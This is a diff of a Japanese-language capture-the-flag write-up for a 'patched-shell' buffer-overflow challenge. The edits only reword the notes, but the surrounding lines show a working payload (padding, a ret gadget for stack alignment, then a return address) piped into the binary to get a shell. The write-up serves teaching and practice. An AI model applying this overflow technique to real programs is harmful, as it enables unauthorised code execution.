@@ -7,6 +7,7 @@ Note: due to the copycat nature of this challenge, it suffers from the same bug 
 [patched-shell](patched-shell)  
 
 # Solution
+[basic-overflow](../basic-overflow)の続きのようだ。  
 execveの代わりにsystemを呼び出しているらしい。  
 ```bash
 $ objdump -D ./patched-shell
@@ -40,7 +41,7 @@ whoami
 Segmentation fault
 ```
 確かにシェルが取れない。  
-おそらくスタックアラインメントだろうと予想し、`ret`を一度挟めばよい。  
+おそらくスタックアライメントが原因で落ちていると予想し、`ret`を一度挟めばよい。  
 ```bash
 $ (echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x4b\x11\x40\x00\x00\x00\x00\x00\x36\x11\x40\x00\x00\x00\x00\x00';cat) | ./patched-shell
 whoami
